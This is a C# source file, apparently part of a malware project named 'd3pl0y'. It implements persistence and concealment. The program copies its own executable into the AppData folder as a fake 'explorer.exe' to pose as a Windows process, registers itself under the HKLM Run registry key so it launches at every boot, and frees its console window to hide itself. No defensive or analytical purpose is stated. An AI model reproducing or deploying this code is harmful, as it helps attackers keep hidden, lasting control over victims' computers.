using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Win32;
using System.IO;
using System.Runtime.InteropServices;
namespace d3pl0y
{
    class Persist
    {
        [DllImport("kernel32.dll")]
        public static extern bool FreeConsole();
        public static void AddStartup()
        {
            try {
                RegistryKey sKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                if (sKey.GetValue("d3pl0y") == null)
                {
                    sKey.SetValue("d3pl0y", System.Reflection.Assembly.GetExecutingAssembly().Location);
                    sKey.Close();
                }
                else {
                    try
                    {
                        RegistryKey cKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                        if (cKey.GetValue("d3pl0y") == null)
                        {

                            cKey.SetValue("d3pl0y", System.Reflection.Assembly.GetExecutingAssembly().Location);

                        }
                        else { Debug.Write("Already in startup for local machine"); }
                    }
                    catch (Exception cKEx) { Debug.Write("Error occured writing to Local machine startup"); }
                

                
                
                
                }
             
            } catch (Exception sKEx) { Debug.Write("Error occured writing to current user startup");}
            

        }
        public static void envSetup()
        {
            if (System.Reflection.Assembly.GetExecutingAssembly().Location != Environment.GetEnvironmentVariable("appdata") + "\\System\\explorer.exe")
            {
                try
               {
                   if (!Directory.Exists(Environment.GetEnvironmentVariable("appdata") + "\\System"))
                   {
                       Directory.CreateDirectory(Environment.GetEnvironmentVariable("appdata") + "\\System");
                   }
                    File.Copy(System.Reflection.Assembly.GetExecutingAssembly().Location, Environment.GetEnvironmentVariable("appdata") + "\\System\\explorer.exe");
                }
                catch { Debug.Write("Error copying exe to appdata"); }
            }
            else { Debug.Write("Exe is in appdata"); }
            AddStartup();
        }
        public static void hide()
        {
            FreeConsole();
        }

    }
}
